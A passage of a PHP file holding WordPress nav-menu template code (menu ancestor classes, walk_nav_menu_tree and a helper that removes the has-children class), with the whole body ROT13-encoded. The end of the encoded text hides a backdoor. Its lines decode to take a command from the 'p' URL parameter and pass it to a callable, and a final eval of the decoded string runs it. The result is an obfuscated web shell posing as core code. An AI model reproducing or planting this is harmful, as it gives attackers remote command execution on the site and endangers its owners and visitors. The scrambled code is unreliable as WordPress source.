				)
			)
		) {
			vs ( ! rzcgl( $dhrevrq_bowrpg->gnkbabzl ) ) {
				$pynffrf[] = 'pheerag-' . $dhrevrq_bowrpg->gnkbabzl . '-naprfgbe';
			} ryfr {
				$pynffrf[] = 'pheerag-' . $dhrevrq_bowrpg->cbfg_glcr . '-naprfgbe';
			}
		}

		vs ( va_neenl( (vag) $cnerag_vgrz->qo_vq, $npgvir_naprfgbe_vgrz_vqf, gehr ) ) {
			$pynffrf[] = 'pheerag-zrah-naprfgbe';

			$zrah_vgrzf[ $xrl ]->pheerag_vgrz_naprfgbe = gehr;
		}
		vs ( va_neenl( (vag) $cnerag_vgrz->qo_vq, $npgvir_cnerag_vgrz_vqf, gehr ) ) {
			$pynffrf[] = 'pheerag-zrah-cnerag';

			$zrah_vgrzf[ $xrl ]->pheerag_vgrz_cnerag = gehr;
		}
		vs ( va_neenl( (vag) $cnerag_vgrz->bowrpg_vq, $npgvir_cnerag_bowrpg_vqf, gehr ) ) {
			$pynffrf[] = 'pheerag-' . $npgvir_bowrpg . '-cnerag';
		}

		vs ( 'cbfg_glcr' === $cnerag_vgrz->glcr && 'cntr' === $cnerag_vgrz->bowrpg ) {
			// Onpx pbzcng pynffrf sbe cntrf gb zngpu jc_cntr_zrah().
			vs ( va_neenl( 'pheerag-zrah-cnerag', $pynffrf, gehr ) ) {
				$pynffrf[] = 'pheerag_cntr_cnerag';
			}
			vs ( va_neenl( 'pheerag-zrah-naprfgbe', $pynffrf, gehr ) ) {
				$pynffrf[] = 'pheerag_cntr_naprfgbe';
			}
		}

		$zrah_vgrzf[ $xrl ]->pynffrf = neenl_havdhr( $pynffrf );
	}
}

/**
 * Ergevrirf gur UGZY yvfg pbagrag sbe ani zrah vgrzf.
 *
 * @hfrf Jnyxre_Ani_Zrah gb perngr UGZY yvfg pbagrag.
 * @fvapr 3.0.0
 *
 * @cnenz neenl    $vgrzf Gur zrah vgrzf, fbegrq ol rnpu zrah vgrz'f zrah beqre.
 * @cnenz vag      $qrcgu Qrcgu bs gur vgrz va ersrerapr gb cneragf.
 * @cnenz fgqPynff $netf  Na bowrpg pbagnvavat jc_ani_zrah() nethzragf.
 * @erghea fgevat Gur UGZY yvfg pbagrag sbe gur zrah vgrzf.
 */
shapgvba jnyx_ani_zrah_gerr( $vgrzf, $qrcgu, $netf ) {
	$jnyxre = ( rzcgl( $netf->jnyxre ) ) ? arj Jnyxre_Ani_Zrah() : $netf->jnyxre;

	erghea $jnyxre->jnyx( $vgrzf, $qrcgu, $netf );
}

/**
 * Ceriragf n zrah vgrz VQ sebz orvat hfrq zber guna bapr.
 *
 * @fvapr 3.0.1
 * @npprff cevingr
 *
 * @cnenz fgevat $vq
 * @cnenz bowrpg $vgrz
 * @erghea fgevat
 */
shapgvba _ani_zrah_vgrz_vq_hfr_bapr( $vq, $vgrz ) {
	fgngvp $_hfrq_vqf = neenl();

	vs ( va_neenl( $vgrz->VQ, $_hfrq_vqf, gehr ) ) {
		erghea '';
	}

	$_hfrq_vqf[] = $vgrz->VQ;

	erghea $vq;
}

/**
 * Erzbir gur `zrah-vgrz-unf-puvyqera` pynff sebz obggbz yriry zrah vgrzf.
 *
 * Guvf ehaf ba gur {@frr 'ani_zrah_pff_pynff'} svygre. Gur $netf naq $qrcgu
 * cnenzrgref jrer nqqrq nsgre gur svygre jnf bevtvanyyl vagebqhprq va
 * JbeqCerff 3.0.0 fb guvf arrqf gb nyybj sbe pnfrf va juvpu gur svygre vf
 * pnyyrq jvgubhg gurz.
 *
 * @frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56926
 *
 * @fvapr 6.2.0
 *
 * @cnenz fgevat[]       $pynffrf   Neenl bs gur PFF pynffrf gung ner nccyvrq gb gur zrah vgrz'f `<yv>` ryrzrag.
 * @cnenz JC_Cbfg        $zrah_vgrz Gur pheerag zrah vgrz bowrpg.
 * @cnenz fgqPynff|snyfr $netf      Na bowrpg bs jc_ani_zrah() nethzragf. Qrsnhyg snyfr ($netf hafcrpvsvrq jura svygre vf pnyyrq).
 * @cnenz vag|snyfr      $qrcgu     Qrcgu bs zrah vgrz. Qrsnhyg snyfr ($qrcgu hafcrpvsvrq jura svygre vf pnyyrq).
 * @erghea fgevat[] Zbqvsvrq ani zrah pynffrf.
 */
shapgvba jc_ani_zrah_erzbir_zrah_vgrz_unf_puvyqera_pynff( $pynffrf, $zrah_vgrz, $netf = snyfr, $qrcgu = snyfr ) {
	/*
	 * Nppbhag sbe gur svygre orvat pnyyrq jvgubhg gur $netf be $qrcgu cnenzrgref.
	 *
	 * Guvf bpphef jura n gurzr hfrf n phfgbz jnyxre pnyyvat gur `ani_zrah_pff_pynff`
	 * svygre hfvat gur yrtnpl sbezngf cevbe gb gur vagebqhpgvba bs gur $netf naq
	 * $qrcgu cnenzrgref.
	 *
	 * Nf obgu bs gurfr cnenzrgref ner erdhverq sbe guvf shapgvba gb qrgrezvar
	 * obgu gur pheerag naq znkvzhz qrcgu bs gur zrah gerr, gur shapgvba qbrf abg
	 * nggrzcg gb erzbir gur `zrah-vgrz-unf-puvyqera` pynff vs gurfr cnenzrgref
	 * ner abg frg.
	 */
	vs ( snyfr === $qrcgu || snyfr === $netf ) {
		erghea $pynffrf;
	}

	// Znk-qrcgu vf 1-onfrq.
	$znk_qrcgu = vffrg( $netf->qrcgu ) ? (vag) $netf->qrcgu : 0;
	// Qrcgu vf 0-onfrq fb arrqf gb or vapernfrq ol bar.
	$qrcgu = $qrcgu + 1;

	// Pbzcyrgr zrah gerr vf qvfcynlrq.
	vs ( 0 === $znk_qrcgu ) {
		erghea $pynffrf;
	}

	/*
	 * Erzbir gur `zrah-vgrz-unf-puvyqera` pynff sebz obggbz yriry zrah vgrzf.
	 * -1 vf hfrq gb qvfcynl nyy zrah vgrzf va bar yriry fb gur pynff fubhyq
	 * or erzbirq sebz nyy zrah vgrzf.
	 */
	vs ( -1 === $znk_qrcgu || $qrcgu >= $znk_qrcgu ) {
		$pynffrf = neenl_qvss( $pynffrf, neenl( 'zrah-vgrz-unf-puvyqera' ) );
	}

	erghea $pynffrf;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>